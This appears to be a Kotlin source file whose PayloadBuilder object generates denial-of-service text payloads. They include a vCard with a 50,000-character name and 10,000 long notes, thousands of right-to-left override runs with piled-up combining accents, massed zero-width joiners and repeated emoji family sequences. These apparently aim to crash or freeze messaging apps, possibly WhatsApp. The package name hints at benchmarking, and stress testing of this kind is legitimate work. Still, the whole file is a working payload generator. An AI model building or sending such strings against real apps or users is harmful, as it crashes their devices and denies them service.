package com.hanz.wabench

object PayloadBuilder {
    private fun rep(n: Int, c: Char) = buildString(n) { repeat(n) { append(c) } }

    fun generate(mode: Int): String = when (mode) {
        0 -> {
            val fam = "\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67\u200D\uD83D\uDC66"
            buildString {
                append("BEGIN:VCARD\nVERSION:3.0\nFN:").append(rep(50000, 'A')).append('\n')
                repeat(10000) { append("NOTE:").append(rep(500, 'x')).append('\n') }
                append("END:VCARD\n").append(rep(2000, '\u200D'))
            }
        }
        1 -> {
            val rlo = "\u202E"; val pdf = "\u202C"
            buildString {
                repeat(3000) { append(rlo).append(rep(100, 'a')).append(pdf) }
                append(rep(20000, '\u0301'))
            }
        }
        2 -> rep(60000, 'A')
        3 -> {
            val fam = "\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67\u200D\uD83D\uDC66"
            buildString { repeat(800) { append(fam) } }
        }
        else -> rep(25000, '\u200D')
    }
}
